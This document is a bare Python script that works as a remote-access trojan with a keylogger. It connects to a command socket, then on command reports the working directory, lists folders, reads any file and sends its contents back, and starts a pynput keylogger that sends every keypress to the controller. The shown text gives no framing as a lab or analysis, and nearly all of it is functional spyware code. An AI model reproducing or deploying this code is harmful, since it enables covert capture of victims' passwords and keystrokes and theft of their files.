import socket as s
import os
import threading
from pynput.keyboard import Listener
socket = s.socket()
HOST = "127.0.0.1"
PORT = 1234
flag_key_loggger_break = False

socket.connect((HOST, PORT))


def key_log():
    global flag_key_loggger_break
    while True:
        if flag_key_loggger_break == True:
            break
        with Listener(on_press=lambda a: socket.send(str(a).encode())) as listener:
            listener.join()


while True:
    data = socket.recv(1024)
    if data == b'view_cwd':
        resp = os.getcwd()
        socket.send(resp.encode())
    elif data == b'dir':
        while True:
            w_dir = socket.recv(1024)
            if w_dir:
                break
        resp = os.listdir(w_dir.decode())
        socket.send(str(resp).encode())
    elif data == b"download_file":
        while True:
            fn = socket.recv(1024)
            if fn:
                break
        f = open(fn, "rb")
        resp = f.read()
        socket.send(resp)
    elif data == b'key_logger':
        a = threading.Thread(target=key_log)
        a.start()
    elif data == b'key_logger_close':
        flag_key_loggger_break = True
